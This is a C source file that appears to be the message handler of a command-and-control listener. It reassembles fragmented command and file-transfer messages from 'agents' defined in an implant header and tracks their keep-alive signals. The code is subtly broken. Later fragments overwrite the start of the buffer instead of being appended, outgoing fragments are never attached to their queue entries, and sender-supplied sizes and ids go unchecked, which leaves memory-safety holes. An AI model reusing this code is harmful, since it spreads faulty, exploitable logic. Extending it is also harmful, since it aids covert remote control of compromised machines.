/*
message_handler.c

This file is responsible for the following:
* fragmenting messages that are being sent out
* assembling fragmented messages from agents
* handling alive messages
* passing messages to and from console

*/

#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <pthread.h>
#include <string.h>

#include <arpa/inet.h>

#include "utility.h"
#include "queue.h"
#include "implant.h"
#include "base.h"
#include "message_handler.h"

#define FDSIZE			10

// Globals
extern Queue* listener_receive_queue;
extern pthread_mutex_t listener_receive_queue_lock;
extern Queue* listener_send_queue;
extern pthread_mutex_t listener_send_queue_lock;
//extern Agent** agents;
extern Agent* agents[FDSIZE]; 

void *handle_message(void*){
	Queue_Message* message;
	Fragment* fragment;
	
	for (;;){
		sleep(1);
		if (!(message = dequeue(listener_receive_queue, &listener_receive_queue_lock))) continue;
		debug_print("%s\n", "removing message from queue");
		
		// check if socket file descriptor was removed from agents global variable
		if (agents[message->id] == NULL){
			printf("!ERROR agents\n");
			continue;
		}
		
		fragment = message->fragment;
		// if type is alive packet, update keep alive parameter
		if (fragment->type == TYPE_ALIVE){
			printf("Agent %d is alive: %lu seconds\n", message->id, (unsigned long)ntohl(fragment->first_payload.alive_time));
			agents[message->id]->alive = (uint)time(NULL);
		}
		else if (fragment->type == TYPE_COMMAND || fragment->type == TYPE_PUT_FILE || fragment->type == TYPE_GET_FILE){
			if (agents[message->id]->last_fragment_index == -1 && fragment->index == 0){
				// get payload size
				agents[message->id]->total_message_size = fragment->first_payload.total_size;
				
				// set last fragment index
				agents[message->id]->last_fragment_index = 0;
				
				// allocate memory and null
				agents[message->id]->message = malloc(agents[message->id]->total_message_size);
				memset(agents[message->id]->message, 0, agents[message->id]->total_message_size);
				
				int this_payload_size = message->fragment_size - sizeof(fragment->type) - sizeof(fragment->index) - sizeof(fragment->first_payload.total_size);
				
				// copy payload (not including total message size) to message buffer
				memcpy(agents[message->id]->message, fragment->first_payload.actual_payload, this_payload_size);
				
				// record current size of message
				agents[message->id]->current_message_size = this_payload_size;
				
			}
			else if (fragment->index == agents[message->id]->last_fragment_index++){
				int this_payload_size = message->fragment_size - sizeof(fragment->type) - sizeof(fragment->index);
				
				// copy payload to end of message buffer
				memcpy(agents[message->id]->message, fragment->next_payload, this_payload_size);
				
				// update current size of message
				agents[message->id]->current_message_size += this_payload_size;
			}
			else{
				// We are out of order. Dump all collected packets and try again next time
				agents[message->id]->last_fragment_index = -1;
			}
			
			// check if we received all fragments
			if (agents[message->id]->total_message_size == agents[message->id]->current_message_size){
				printf("Do something with completed message %s\n", agents[message->id]->message);
				agents[message->id]->last_fragment_index = -1;
			}
		}
		free(message->fragment);
		free(message);
	}
	return 0;
}

int prepare_message(int sockfd, int type, char* message, int message_size){
	Queue_Message* queue_message;
	Fragment* fragment;
	int bytes_sent = 0;
	char* buf;
	
	// prepare first fragment with size in first 4 bytes
	fragment = malloc(sizeof(Fragment));
	fragment->type = type;
	fragment->index = 0;
	fragment->first_payload.total_size = message_size;
	
	bytes_sent = message_size < (BUFFERSIZE - 4) ? message_size : BUFFERSIZE - 4;
	memcpy(fragment->first_payload.actual_payload, message, bytes_sent);
	
	queue_message = malloc(sizeof(Queue_Message));
	queue_message->id = sockfd;
	queue_message->fragment_size = bytes_sent;
	queue_message->fragment = fragment;

	enqueue(listener_send_queue, &listener_send_queue_lock, queue_message);
	
	while (bytes_sent < message_size){
		fragment = malloc(sizeof(Fragment));
		fragment->type = type;
		fragment->index = 0;
		
		int num_fragment_bytes = (message_size - bytes_sent) < BUFFERSIZE ? (message_size - bytes_sent) : BUFFERSIZE;
		memcpy(fragment->next_payload, message + bytes_sent, num_fragment_bytes);
		
		queue_message = malloc(sizeof(Queue_Message));
		queue_message->id = sockfd;
		queue_message->fragment_size = num_fragment_bytes;

		enqueue(listener_send_queue, &listener_send_queue_lock, queue_message);
		
		bytes_sent += num_fragment_bytes;
	}
	
	free(message);
	
	return 0;
}




